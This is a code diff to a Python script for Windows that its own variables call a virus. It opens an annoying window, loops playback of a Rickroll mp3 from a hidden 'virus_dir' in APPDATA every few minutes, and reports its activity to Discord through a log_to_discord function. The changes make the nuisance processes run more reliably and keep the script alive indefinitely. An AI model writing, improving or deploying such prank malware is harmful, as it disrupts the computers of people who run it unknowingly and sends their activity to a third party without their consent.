@@ -1,5 +1,5 @@
-import os, requests
-import time
+import os, requests, time, threading
+from multiprocessing import Process
 timestamp = time.time()
 home_dir = os.path.expanduser("~")
 appdata = os.environ['APPDATA']
@@ -36,26 +36,24 @@ def open_window(delay = 0):
     root.mainloop()
 
 def start():
-    global timestamp, threading
+    global timestamp
     chnapik_duration = 2*60+10
-    threading.Thread(target=open_window()).start()
-    import os
-    try:
-        from multiprocessing import Process
-        def music_func():
-            log_to_discord("Starting music loop...")
+
+    # Run the annoying window in a separate thread
+    window_thread = threading.Thread(target=open_window, daemon=True)
+    window_thread.start()
+
+    def music_loop():
+        log_to_discord("Starting music loop...")
         while True:
             log_to_discord("Playing music...")
             os.system(f'start "" "{os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3")}"')
             time.sleep(chnapik_duration)
+            time.sleep(10 * 60) # 10 min delay
 
-            time.sleep(10 * 60) # 10 min delay 
-            music = Process(target=music_func)
-            music.start() 
-    except Exception as e:
-        # Windows is weird
-        log_to_discord(f"Windows is being weird, music didnt start, error: {e}")
-
+    music_process = Process(target=music_loop, daemon=True)
+    music_process.start()
+    while True: time.sleep(3600) # Keep the main script alive for daemon threads
 
 
 if __name__ == "__main__":
